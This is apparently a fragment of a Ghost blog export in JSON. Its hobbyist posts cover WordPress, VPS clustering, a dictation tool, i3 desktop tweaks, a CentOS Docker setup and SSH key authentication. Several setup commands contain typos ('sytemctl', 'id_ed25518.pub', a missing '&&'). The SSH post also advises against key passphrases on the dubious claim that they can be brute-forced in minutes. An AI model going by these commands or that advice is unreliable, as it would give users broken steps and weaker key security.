I\nhave this site primarily to educate myself about hosting various web services,\nwith a secondary goal of having a publishing platform. I’m also a photographer,\nso many of the posts in this blog are photos I’ve taken, not to mention photos I\nuse for demonstration in text articles. To not be able to make a clean backup of\nfiles including storing the media file itself in a folder is simply\nunacceptable.\n\nHowever, that is a great advantage to services like wordpress — anyone can write\na plugin or fix for this issue, even me (although I don’t think I have the\nskills to do that). Once one person does that, it solves the problem for\neverybody. We all reap the benefits, not just the person that did the work, and\nin exchange they get to reap the benefits of what other people have created.\n\nAnother issue I have with WordPress is that it’s written in PHP, which in my\nopinion sucks. Perhaps one of these days I’ll get around to figuring out some\nway to use a WordPress plugin as a wrapper for a script in a more sensible\nlanguage like Python or Go.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-09-12T04:23:57.000Z","created_by":"1","updated_at":"2017-12-03T15:46:01.000Z","updated_by":"1","published_at":"2017-09-12T04:23:57.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332792","uuid":"84b74a11-be9a-4306-97c6-e0756fefd40b","title":"Moving from a locally hosted server to a cluster","slug":"temp-slug-46","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nIt recently came to my attention that VPSs are incredibly cheap. I hadn’t checked the prices pretty much since they first became a thing. Needless to say I was shocked when I realized I could realistically back up most of the features of my sites to multiple sites for less than $10 a month. The only thing that remains expensive is storage, and that, IMO, is because everyone’s going for fast-as-possible SSDs. I intend to set up a local NFS server (backed up by a RAID array of 3TB or larger spinning disk drives) to augment this issue.\\n\\nIn the meantime, I’ve been using these machines to experiment with new environments. With the obvious exception of kernel updates, OpenVZ systems are very capable. Unfortunately, as my OpenVZ environment is based on Linux kernel 2.9, I don’t find it very useful, and often turn to the complete KVM environment. Additionally, my provider of OpenVZ environment explicitly disallows the installation of docker, seriously limiting it’s usability as a multi-functional server.\\n\\nIn this environment I have been studying the concepts of scalability and clustering. As a part of that effort I have been learning docker and reading up on the concepts of multi-server systems, such as redundancy and load balancing. I intend to migrate my systems to docker in order to enable cross-server load-balanced mirroring and scalability. This would also enable me to begin advertising consistent uptime for any of my sites – a significant hurdle I’ve been waiting to cross before advertising custom built web services.\\n\\nCurrently my various web services and sites get little to no daily traffic, and the majority of my logs seem to be the result of bot traffic and scans. However, should that change, the ability to move from a few servers to many quickly and painlessly can help to avoid downtime and instability. Unfortunately, any cluster management system requires at least three machines, and since my provider disallows Docker installation on OpenVZ platforms, that leaves me with two machines, unless I want to move to virtualized systems. I’ll probably either do a virtualized or 3-server system soon, I just would prefer to start with one system and scale up from there rather than starting with three, but I can understand how that maked sense from the point of view of those creating container-orchestration systems (for example Google when creating Kubernetes).\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>It recently came to my attention that VPSs are incredibly cheap. I hadn’t checked the prices pretty much since they first became a thing. Needless to say I was shocked when I realized I could realistically back up most of the features of my sites to multiple sites for less than $10 a month. The only thing that remains expensive is storage, and that, IMO, is because everyone’s going for fast-as-possible SSDs. I intend to set up a local NFS server (backed up by a RAID array of 3TB or larger spinning disk drives) to augment this issue.</p>\n<p>In the meantime, I’ve been using these machines to experiment with new environments. With the obvious exception of kernel updates, OpenVZ systems are very capable. Unfortunately, as my OpenVZ environment is based on Linux kernel 2.9, I don’t find it very useful, and often turn to the complete KVM environment. Additionally, my provider of OpenVZ environment explicitly disallows the installation of docker, seriously limiting it’s usability as a multi-functional server.</p>\n<p>In this environment I have been studying the concepts of scalability and clustering. As a part of that effort I have been learning docker and reading up on the concepts of multi-server systems, such as redundancy and load balancing. I intend to migrate my systems to docker in order to enable cross-server load-balanced mirroring and scalability. This would also enable me to begin advertising consistent uptime for any of my sites – a significant hurdle I’ve been waiting to cross before advertising custom built web services.</p>\n<p>Currently my various web services and sites get little to no daily traffic, and the majority of my logs seem to be the result of bot traffic and scans. However, should that change, the ability to move from a few servers to many quickly and painlessly can help to avoid downtime and instability. Unfortunately, any cluster management system requires at least three machines, and since my provider disallows Docker installation on OpenVZ platforms, that leaves me with two machines, unless I want to move to virtualized systems. I’ll probably either do a virtualized or 3-server system soon, I just would prefer to start with one system and scale up from there rather than starting with three, but I can understand how that maked sense from the point of view of those creating container-orchestration systems (for example Google when creating Kubernetes).</p>\n</div>","amp":"417","plaintext":"It recently came to my attention that VPSs are incredibly cheap. I hadn’t\nchecked the prices pretty much since they first became a thing. Needless to say\nI was shocked when I realized I could realistically back up most of the features\nof my sites to multiple sites for less than $10 a month. The only thing that\nremains expensive is storage, and that, IMO, is because everyone’s going for\nfast-as-possible SSDs. I intend to set up a local NFS server (backed up by a\nRAID array of 3TB or larger spinning disk drives) to augment this issue.\n\nIn the meantime, I’ve been using these machines to experiment with new\nenvironments. With the obvious exception of kernel updates, OpenVZ systems are\nvery capable. Unfortunately, as my OpenVZ environment is based on Linux kernel\n2.9, I don’t find it very useful, and often turn to the complete KVM\nenvironment. Additionally, my provider of OpenVZ environment explicitly\ndisallows the installation of docker, seriously limiting it’s usability as a\nmulti-functional server.\n\nIn this environment I have been studying the concepts of scalability and\nclustering. As a part of that effort I have been learning docker and reading up\non the concepts of multi-server systems, such as redundancy and load balancing.\nI intend to migrate my systems to docker in order to enable cross-server\nload-balanced mirroring and scalability. This would also enable me to begin\nadvertising consistent uptime for any of my sites – a significant hurdle I’ve\nbeen waiting to cross before advertising custom built web services.\n\nCurrently my various web services and sites get little to no daily traffic, and\nthe majority of my logs seem to be the result of bot traffic and scans. However,\nshould that change, the ability to move from a few servers to many quickly and\npainlessly can help to avoid downtime and instability. Unfortunately, any\ncluster management system requires at least three machines, and since my\nprovider disallows Docker installation on OpenVZ platforms, that leaves me with\ntwo machines, unless I want to move to virtualized systems. I’ll probably either\ndo a virtualized or 3-server system soon, I just would prefer to start with one\nsystem and scale up from there rather than starting with three, but I can\nunderstand how that maked sense from the point of view of those creating\ncontainer-orchestration systems (for example Google when creating Kubernetes).","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-09-12T04:42:04.000Z","created_by":"1","updated_at":"2017-09-12T04:42:04.000Z","updated_by":"1","published_at":"2018-09-04T15:10:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332793","uuid":"73c423cc-f76d-4c3d-97c6-e940bf4bf91b","title":"Free Speech","slug":"temp-slug-47","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nA few months ago, I began to realize that the intermittent pain in my fingers was not going to continue being so intermittent forever. I’ve come down with the most common injury of my generation. I like to call it “hacker hands”. People who spend a lot of time at a desk, typing inevitably end up with some sort of chronic hand pain.\\n\\nI’ve heard the story a few times, but it wasn’t until I heard someone talking about it that I became acutely aware of the pattern I was suddenly facing. After spending significant amount of time typing or what have you, I would always wind up with achey hands. This has progressed over the past few years as I’ve additionally taken up driving as a profession, which holds you at a similar posture.\\n\\nAs it stands now, I’ve got consistent pain in my hands, with intermittent pain and numbness in the joints on my other fingers. It’s even gotten up to my neck at times, resulting in headaches that last for days.\\n\\nI had been greatly inspired some months before this revelation by a video posted by Tavis Rudd. In it, he demonstrated a realistic system for not only voice dictation, but using that voice dictation to write code using a made-up language of “grunts, animal sounds, and various other noises”.\\n\\nThe problem was his setup. I mean, holy shit, what a cluge-y mess.\\n\\nHe had Windows running in a virtual machine, which was running a heavily modified Dragon Naturally Speaking. Dragon would interpret the sound and commands through its API, then send those commands back out of the VM into either VIM or a BASH or similar terminal. Not only do I refuse to use Dragon in a Windows VM, I literally can’t. My computers can barely run Windows, let alone inside of a VM on top of my usual linux system. I *need* something with native, workable support.\\n\\nWhile I was looking into this after coming to the realization that I would no longer be able to continue what I was doing, I discovered an open-source project called FreeSpeech.\\n\\nFreeSpeech is a very simple Python application which pulls audio from gstreamer, pushes that to CMU’s PocketSphinx, analyses the response with the CMU/Cambridge statistaical modelling toolkit, and then filters and outputs the dictation results to a text box, and handles its GUI through GTK.\\n\\nAll that in less that 700 lines of python.\\n\\n \\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>A few months ago, I began to realize that the intermittent pain in my fingers was not going to continue being so intermittent forever. I’ve come down with the most common injury of my generation. I like to call it “hacker hands”. People who spend a lot of time at a desk, typing inevitably end up with some sort of chronic hand pain.</p>\n<p>I’ve heard the story a few times, but it wasn’t until I heard someone talking about it that I became acutely aware of the pattern I was suddenly facing. After spending significant amount of time typing or what have you, I would always wind up with achey hands. This has progressed over the past few years as I’ve additionally taken up driving as a profession, which holds you at a similar posture.</p>\n<p>As it stands now, I’ve got consistent pain in my hands, with intermittent pain and numbness in the joints on my other fingers. It’s even gotten up to my neck at times, resulting in headaches that last for days.</p>\n<p>I had been greatly inspired some months before this revelation by a video posted by Tavis Rudd. In it, he demonstrated a realistic system for not only voice dictation, but using that voice dictation to write code using a made-up language of “grunts, animal sounds, and various other noises”.</p>\n<p>The problem was his setup. I mean, holy shit, what a cluge-y mess.</p>\n<p>He had Windows running in a virtual machine, which was running a heavily modified Dragon Naturally Speaking. Dragon would interpret the sound and commands through its API, then send those commands back out of the VM into either VIM or a BASH or similar terminal. Not only do I refuse to use Dragon in a Windows VM, I literally can’t. My computers can barely run Windows, let alone inside of a VM on top of my usual linux system. I <em>need</em> something with native, workable support.</p>\n<p>While I was looking into this after coming to the realization that I would no longer be able to continue what I was doing, I discovered an open-source project called FreeSpeech.</p>\n<p>FreeSpeech is a very simple Python application which pulls audio from gstreamer, pushes that to CMU’s PocketSphinx, analyses the response with the CMU/Cambridge statistaical modelling toolkit, and then filters and outputs the dictation results to a text box, and handles its GUI through GTK.</p>\n<p>All that in less that 700 lines of python.</p>\n<p></p>\n</div>","amp":"657","plaintext":"A few months ago, I began to realize that the intermittent pain in my fingers\nwas not going to continue being so intermittent forever. I’ve come down with the\nmost common injury of my generation. I like to call it “hacker hands”. People\nwho spend a lot of time at a desk, typing inevitably end up with some sort of\nchronic hand pain.\n\nI’ve heard the story a few times, but it wasn’t until I heard someone talking\nabout it that I became acutely aware of the pattern I was suddenly facing. After\nspending significant amount of time typing or what have you, I would always wind\nup with achey hands. This has progressed over the past few years as I’ve\nadditionally taken up driving as a profession, which holds you at a similar\nposture.\n\nAs it stands now, I’ve got consistent pain in my hands, with intermittent pain\nand numbness in the joints on my other fingers. It’s even gotten up to my neck\nat times, resulting in headaches that last for days.\n\nI had been greatly inspired some months before this revelation by a video posted\nby Tavis Rudd. In it, he demonstrated a realistic system for not only voice\ndictation, but using that voice dictation to write code using a made-up language\nof “grunts, animal sounds, and various other noises”.\n\nThe problem was his setup. I mean, holy shit, what a cluge-y mess.\n\nHe had Windows running in a virtual machine, which was running a heavily\nmodified Dragon Naturally Speaking. Dragon would interpret the sound and\ncommands through its API, then send those commands back out of the VM into\neither VIM or a BASH or similar terminal. Not only do I refuse to use Dragon in\na Windows VM, I literally can’t. My computers can barely run Windows, let alone\ninside of a VM on top of my usual linux system. I need  something with native,\nworkable support.\n\nWhile I was looking into this after coming to the realization that I would no\nlonger be able to continue what I was doing, I discovered an open-source project\ncalled FreeSpeech.\n\nFreeSpeech is a very simple Python application which pulls audio from gstreamer,\npushes that to CMU’s PocketSphinx, analyses the response with the CMU/Cambridge\nstatistaical modelling toolkit, and then filters and outputs the dictation\nresults to a text box, and handles its GUI through GTK.\n\nAll that in less that 700 lines of python.","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-09-15T21:28:54.000Z","created_by":"1","updated_at":"2017-09-15T21:28:54.000Z","updated_by":"1","published_at":"2018-09-04T15:10:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332794","uuid":"c267336b-c72a-4c85-8550-55c7bace7801","title":"Some cool desktop effects","slug":"some-cool-desktop-effects","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI have been using i3 as a window manager for the past few years, especially since switching from Ubuntu to Debian proper. I don’t use a desktop environment to wrap i3 in, but I do have a suite of applications I use, such as a terminal emulator (terminator), web browser (chromium), and a file manager (pcmanfm).\\n\\nI wanted to enable the transparent background feature of terminator (many terminals support this), and that idea sent me down a rabbit hole. Apparently, i3 is not a [compositing window manager](https://faq.i3wm.org/question/3279/do-i-need-a-composite-manager-compton.1.html), and in order to add transparency (or compositing) to a window manager, you have to install an additional program (namely [compton](https://github.com/chjj/compton)) and have it start when you boot. Instead of simply starting it and setting up the transparent background in my terminal like I originally set out to do, I set compton to make all inactive windows as partially transparent.\\n\\nIf you’ve ever used i3, you’ll know that the window focus follows the mouse pointer, which combined with the compton transparency creates a very nice effect where the window you’re working in snaps into focus when you move to it. However, if you’ve ever used Debian, you’ll know that the [default background](https://www.neowin.net/images/uploaded/2016/10/1477531942_debian-9-wallpaper_story.jpg) leaves something to be desired. So I went on a search for 3 monitor-wide 1080p wallpapers, put them in a folder, and then wrote this to my .fehbg file:\\n\\n```\\n#!/bin/sh<br></br>\\nfeh --no-xinerama --image-bg black --no-fehbg --bg-max $(find /home/scott/Pictures/Wallpapers -iname *.jpg | sort -R | head -n1)```\\n\\nInitially, I was very confused because every time I ran this command it would overwrite itself, replacing the $(subshell bit) with the literal filename of the background it had chosen. After I left and came back to it, I realized that it was feh itself that was overwriting the script with what it perceived to be the correct script. I’m going to make sure to create a .fehbg.bak now in case this happens again.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I have been using i3 as a window manager for the past few years, especially since switching from Ubuntu to Debian proper. I don’t use a desktop environment to wrap i3 in, but I do have a suite of applications I use, such as a terminal emulator (terminator), web browser (chromium), and a file manager (pcmanfm).</p>\n<p>I wanted to enable the transparent background feature of terminator (many terminals support this), and that idea sent me down a rabbit hole. Apparently, i3 is not a <a href=\"https://faq.i3wm.org/question/3279/do-i-need-a-composite-manager-compton.1.html\">compositing window manager</a>, and in order to add transparency (or compositing) to a window manager, you have to install an additional program (namely <a href=\"https://github.com/chjj/compton\">compton</a>) and have it start when you boot. Instead of simply starting it and setting up the transparent background in my terminal like I originally set out to do, I set compton to make all inactive windows as partially transparent.</p>\n<p>If you’ve ever used i3, you’ll know that the window focus follows the mouse pointer, which combined with the compton transparency creates a very nice effect where the window you’re working in snaps into focus when you move to it. However, if you’ve ever used Debian, you’ll know that the <a href=\"https://www.neowin.net/images/uploaded/2016/10/1477531942_debian-9-wallpaper_story.jpg\">default background</a> leaves something to be desired. So I went on a search for 3 monitor-wide 1080p wallpapers, put them in a folder, and then wrote this to my .fehbg file:</p>\n<pre><code>#!/bin/sh&lt;br&gt;&lt;/br&gt;\nfeh --no-xinerama --image-bg black --no-fehbg --bg-max $(find /home/scott/Pictures/Wallpapers -iname *.jpg | sort -R | head -n1)```\n\nInitially, I was very confused because every time I ran this command it would overwrite itself, replacing the $(subshell bit) with the literal filename of the background it had chosen. After I left and came back to it, I realized that it was feh itself that was overwriting the script with what it perceived to be the correct script. I’m going to make sure to create a .fehbg.bak now in case this happens again.\n\n\n</code></pre>\n</div>","amp":"659","plaintext":"I have been using i3 as a window manager for the past few years, especially\nsince switching from Ubuntu to Debian proper. I don’t use a desktop environment\nto wrap i3 in, but I do have a suite of applications I use, such as a terminal\nemulator (terminator), web browser (chromium), and a file manager (pcmanfm).\n\nI wanted to enable the transparent background feature of terminator (many\nterminals support this), and that idea sent me down a rabbit hole. Apparently,\ni3 is not a compositing window manager\n[https://faq.i3wm.org/question/3279/do-i-need-a-composite-manager-compton.1.html]\n, and in order to add transparency (or compositing) to a window manager, you\nhave to install an additional program (namely compton\n[https://github.com/chjj/compton]) and have it start when you boot. Instead of\nsimply starting it and setting up the transparent background in my terminal like\nI originally set out to do, I set compton to make all inactive windows as\npartially transparent.\n\nIf you’ve ever used i3, you’ll know that the window focus follows the mouse\npointer, which combined with the compton transparency creates a very nice effect\nwhere the window you’re working in snaps into focus when you move to it.\nHowever, if you’ve ever used Debian, you’ll know that the default background\n[https://www.neowin.net/images/uploaded/2016/10/1477531942_debian-9-wallpaper_story.jpg] \n leaves something to be desired. So I went on a search for 3 monitor-wide 1080p\nwallpapers, put them in a folder, and then wrote this to my .fehbg file:\n\n#!/bin/sh<br></br>\nfeh --no-xinerama --image-bg black --no-fehbg --bg-max $(find /home/scott/Pictures/Wallpapers -iname *.jpg | sort -R | head -n1)```\n\nInitially, I was very confused because every time I ran this command it would overwrite itself, replacing the $(subshell bit) with the literal filename of the background it had chosen. After I left and came back to it, I realized that it was feh itself that was overwriting the script with what it perceived to be the correct script. I’m going to make sure to create a .fehbg.bak now in case this happens again.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-09-23T23:09:10.000Z","created_by":"1","updated_at":"2017-09-23T23:16:30.000Z","updated_by":"1","published_at":"2017-09-23T23:09:10.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332795","uuid":"9ce53e4e-b453-4d79-a904-9f7e61ca0039","title":"From CentOS 7 to running docker in less than 15 minutes.","slug":"from-centos-7-to-running-docker-in-less-than-15-minutes","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nSet up a new CentOS 7 image in the Solus VM manager page.\\n\\nCreate a new root password for it (in the VM manager), and log in through ssh, like this `ssh root@{IP_OF_YOUR_VPS} ↩ {YOUR_PASSWORD}`\\n\\nFor more information about any commands I say to run, first run `yum -y install man` to install the manuals database, then run man {CMD}where {CMD} is the command you’re curious about. For example, `man yum`\\n\\nTo create a new user, we should run `yum -y install sudo && groupadd sudo && useradd -G sudo {USER} passwd {USER}` because CentOS minimal doesn’t have sudo by defualt. You also need to edit /etc/sudoers to change the line beginning with %wheels to be %sudo I don’t get that, but that’s how it is. Then, you should switch to your new user.\\n\\nAlright, let’s set up SSH:  \\n`echo \\\"{Elliptic (25519) or prime-pair (RSA) based publikey}\\\" > /home/{USER}/.ssh/authorized_keys` and make sure the permissions are 700 for .ssh and 600 for .ssh/authorized_keys\\n\\nrun: `sudo yum install -y yum-utils device-mapper-persistent-data lvm2 && sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo` to install dependencies and set up the repo. Then  `sudo yum makecache fast && sudo yum install docker-ce-stable && sudo sytemctl start docker`  \\n So you don’t have to run every docker command as sudo: `sudo usermod -a -G docker {USER}`  \\n Then you need to logout with Ctrl+D or the logout/exit command, and once you log back in, you can run your first docker image: `docker run hello-world`\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Set up a new CentOS 7 image in the Solus VM manager page.</p>\n<p>Create a new root password for it (in the VM manager), and log in through ssh, like this <code>ssh root@{IP_OF_YOUR_VPS} ↩ {YOUR_PASSWORD}</code></p>\n<p>For more information about any commands I say to run, first run <code>yum -y install man</code> to install the manuals database, then run man {CMD}where {CMD} is the command you’re curious about. For example, <code>man yum</code></p>\n<p>To create a new user, we should run <code>yum -y install sudo &amp;&amp; groupadd sudo &amp;&amp; useradd -G sudo {USER} passwd {USER}</code> because CentOS minimal doesn’t have sudo by defualt. You also need to edit /etc/sudoers to change the line beginning with %wheels to be %sudo I don’t get that, but that’s how it is. Then, you should switch to your new user.</p>\n<p>Alright, let’s set up SSH:<br>\n<code>echo &quot;{Elliptic (25519) or prime-pair (RSA) based publikey}&quot; &gt; /home/{USER}/.ssh/authorized_keys</code> and make sure the permissions are 700 for .ssh and 600 for .ssh/authorized_keys</p>\n<p>run: <code>sudo yum install -y yum-utils device-mapper-persistent-data lvm2 &amp;&amp; sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</code> to install dependencies and set up the repo. Then  <code>sudo yum makecache fast &amp;&amp; sudo yum install docker-ce-stable &amp;&amp; sudo sytemctl start docker</code><br>\nSo you don’t have to run every docker command as sudo: <code>sudo usermod -a -G docker {USER}</code><br>\nThen you need to logout with Ctrl+D or the logout/exit command, and once you log back in, you can run your first docker image: <code>docker run hello-world</code></p>\n</div>","amp":"672","plaintext":"Set up a new CentOS 7 image in the Solus VM manager page.\n\nCreate a new root password for it (in the VM manager), and log in through ssh,\nlike this ssh root@{IP_OF_YOUR_VPS} ↩ {YOUR_PASSWORD}\n\nFor more information about any commands I say to run, first run yum -y install\nman  to install the manuals database, then run man {CMD}where {CMD} is the\ncommand you’re curious about. For example, man yum\n\nTo create a new user, we should run yum -y install sudo && groupadd sudo &&\nuseradd -G sudo {USER} passwd {USER}  because CentOS minimal doesn’t have sudo\nby defualt. You also need to edit /etc/sudoers to change the line beginning with\n%wheels to be %sudo I don’t get that, but that’s how it is. Then, you should\nswitch to your new user.\n\nAlright, let’s set up SSH:\necho \"{Elliptic (25519) or prime-pair (RSA) based publikey}\" >\n/home/{USER}/.ssh/authorized_keys  and make sure the permissions are 700 for\n.ssh and 600 for .ssh/authorized_keys\n\nrun: sudo yum install -y yum-utils device-mapper-persistent-data lvm2 && sudo\nyum-config-manager --add-repo\nhttps://download.docker.com/linux/centos/docker-ce.repo  to install dependencies\nand set up the repo. Then  sudo yum makecache fast && sudo yum install\ndocker-ce-stable && sudo sytemctl start docker\nSo you don’t have to run every docker command as sudo: sudo usermod -a -G docker\n{USER}\nThen you need to logout with Ctrl+D or the logout/exit command, and once you log\nback in, you can run your first docker image: docker run hello-world","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-10-12T19:30:47.000Z","created_by":"1","updated_at":"2017-10-12T19:30:47.000Z","updated_by":"1","published_at":"2017-10-12T19:30:47.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332796","uuid":"296c58b0-7aff-47bf-9920-b3bee62f5c31","title":"Creating and using SSH keys","slug":"creating-and-using-ssh-keys","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nIf you have password authentication on your ssh port, the assumption is generally that you will have a weak password, and your system will be constantly bombarded with bot requests trying to brute-force your SSH port. For this reason, even if you have a strong password, I would recommend using key-management systems. If you trust *every single* device on your LAN, and have your SSH server port blocked on your NAT router, then you don’t need to worry about this step, but if you have an IOT device, Windows machine, or off-brand printer on your network, or you open your SSH port to the net so that you can access your system from your phone or laptop, I’d recommend key-based authentication rather than password-based.\\n\\nAlso, key-based authentication is a set-it-and-forget-it technology. You don’t have to type any passwords or do anything aside from take these first simple steps to authenticate.\\n\\n<span style=\\\"text-decoration: underline;\\\">**On the device you intend to access remotely (I.E. the “server”):**</span>\\n\\n1. Be sure openssh-server is installed\\n2. Edit /etc/ssh/sshd_config to disallow root login and password login by any user.\\n\\n<span style=\\\"text-decoration: underline;\\\">**On the device you intend to access the device with (I.E. the “client”):**</span>\\n\\n1. Run `ssh-keygen -t ed25519`- Note that this uses an [elliptic-curve](https://en.wikipedia.org/wiki/Elliptic-curve_cryptography) key rather than a [dual-prime](https://en.wikipedia.org/wiki/Integer_factorization#Prime_decomposition) key.\\n- elliptic-curve keys are faster to generate and confirm, and [shorter](https://en.wikipedia.org/wiki/Elliptic-curve_cryptography#Key_sizes) than [dual-prime keys](https://en.wikipedia.org/wiki/RSA_(cryptosystem))\\n2. Run `cat .ssh/id_ed25518.pub`\\n3. Copy the public key.\\n\\n**On the device you intend to access remotely (I.E. the “server”):**\\n\\n1. Run `echo {paste} >> .ssh/authorized_keys`\\n\\nThat’s it! From now on, no more typing in lengthy passwords, and it’s *more* secure!    (That is, assuming your key isn’t compromised)\\n\\n**Edit:** I feel this post is incomplete without mentioning key passphrases. Cryptographic keys like this can be signed with a passphrase as a second factor of authentication, but this only provides a slight advantage over leaving the password blank, and in my opinion is too inconvenient except for the most worrisome and dire circumstances. Having a key passphrase prevents someone who doesn’ t know it from accessing the relevant account *even if the keys are stolen*. This sounds great, but depending on the strength of the passphrase (of which an increase in strength leads to a great decrease in convenience), it will probably be able to be brute forced in a matter of minutes.\\n\\nSo yes, technically, if you discover that someone has stolen your keys within a few minutes of them doing so, and you have a passphrase, you can log in very quickly and change the keys. However, the chances of you knowing that your keys were stolen and also having the opportunity to log in before the attacker has a chance to use them are slim to none. Hence I would not recommend accepting the inconvenience of using a passphrase.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>If you have password authentication on your ssh port, the assumption is generally that you will have a weak password, and your system will be constantly bombarded with bot requests trying to brute-force your SSH port. For this reason, even if you have a strong password, I would recommend using key-management systems. If you trust <em>every single</em> device on your LAN, and have your SSH server port blocked on your NAT router, then you don’t need to worry about this step, but if you have an IOT device, Windows machine, or off-brand printer on your network, or you open your SSH port to the net so that you can access your system from your phone or laptop, I’d recommend key-based authentication rather than password-based.</p>\n<p>Also, key-based authentication is a set-it-and-forget-it technology. You don’t have to type any passwords or do anything aside from take these first simple steps to authenticate.</p>\n<p><span style=\"text-decoration: underline;\"><strong>On the device you intend to access remotely (I.E. the “server”):</strong></span></p>\n<ol>\n<li>Be sure openssh-server is installed</li>\n<li>Edit /etc/ssh/sshd_config to disallow root login and password login by any user.</li>\n</ol>\n<p><span style=\"text-decoration: underline;\"><strong>On the device you intend to access the device with (I.E. the “client”):</strong></span></p>\n<ol>\n<li>Run <code>ssh-keygen -t ed25519</code>- Note that this uses an <a href=\"https://en.wikipedia.org/wiki/Elliptic-curve_cryptography\">elliptic-curve</a> key rather than a <a href=\"https://en.wikipedia.org/wiki/Integer_factorization#Prime_decomposition\">dual-prime</a> key.</li>\n</ol>\n<ul>\n<li>elliptic-curve keys are faster to generate and confirm, and <a href=\"https://en.wikipedia.org/wiki/Elliptic-curve_cryptography#Key_sizes\">shorter</a> than <a href=\"https://en.wikipedia.org/wiki/RSA_(cryptosystem)\">dual-prime keys</a></li>\n</ul>\n<ol start=\"2\">\n<li>Run <code>cat .ssh/id_ed25518.pub</code></li>\n<li>Copy the public key.</li>\n</ol>\n<p><strong>On the device you intend to access remotely (I.E. the “server”):</strong></p>\n<ol>\n<li>Run <code>echo {paste} &gt;&gt; .ssh/authorized_keys</code></li>\n</ol>\n<p>That’s it! From now on, no more typing in lengthy passwords, and it’s <em>more</em> secure!    (That is, assuming your key isn’t compromised)</p>\n<p><strong>Edit:</strong> I feel this post is incomplete without mentioning key passphrases. Cryptographic keys like this can be signed with a passphrase as a second factor of authentication, but this only provides a slight advantage over leaving the password blank, and in my opinion is too inconvenient except for the most worrisome and dire circumstances. Having a key passphrase prevents someone who doesn’ t know it from accessing the relevant account <em>even if the keys are stolen</em>. This sounds great, but depending on the strength of the passphrase (of which an increase in strength leads to a great decrease in convenience), it will probably be able to be brute forced in a matter of minutes.</p>\n<p>So yes, technically, if you discover that someone has stolen your keys within a few minutes of them doing so, and you have a passphrase, you can log in very quickly and change the keys. However, the chances of you knowing that your keys were stolen and also having the opportunity to log in before the attacker has a chance to use them are slim to none. Hence I would not recommend accepting the inconvenience of using a passphrase.</p>\n</div>","amp":"675","plaintext":"If you have password authentication on your ssh port, the assumption is\ngenerally that you will have a weak password, and your system will be constantly\nbombarded with bot requests trying to brute-force your SSH port. For this\nreason, even if you have a strong password, I would recommend using\nkey-management systems. If you trustevery single  device on your LAN, and have\nyour SSH server port blocked on your NAT router, then you don’t need to worry\nabout this step, but if you have an IOT device, Windows machine, or off-brand\nprinter on your network, or you open your SSH port to the net so that you can\naccess your system from your phone or laptop, I’d recommend key-based\nauthentication rather than password-based.\n\nAlso, key-based authentication is a set-it-and-forget-it technology. You don’t\nhave to type any passwords or do anything aside from take these first simple\nsteps to authenticate.\n\nOn the device you intend to access remotely (I.E. the “server”):\n\n 1. Be sure openssh-server is installed\n 2. Edit /etc/ssh/sshd_config to disallow root login and password login by any\n    user.\n\nOn the device you intend to access the device with (I.E. the “client”):\n\n 1. Run ssh-keygen -t ed25519- Note that this uses an elliptic-curve\n    [https://en.wikipedia.org/wiki/Elliptic-curve_cryptography]  key rather than\n    a dual-prime  key.\n\n * elliptic-curve keys are faster to generate and confirm, and shorter  than \n   dual-prime keys [https://en.wikipedia.org/wiki/RSA_(cryptosystem)]\n\n 2. Run cat .ssh/id_ed25518.pub\n 3. Copy the public key.\n\nOn the device you intend to access remotely (I.E. the “server”):\n\n 1. Run echo {paste} >> .ssh/authorized_keys\n\nThat’s it! From now on, no more typing in lengthy passwords, and it’smore \nsecure!    (That is, assuming your key isn’t 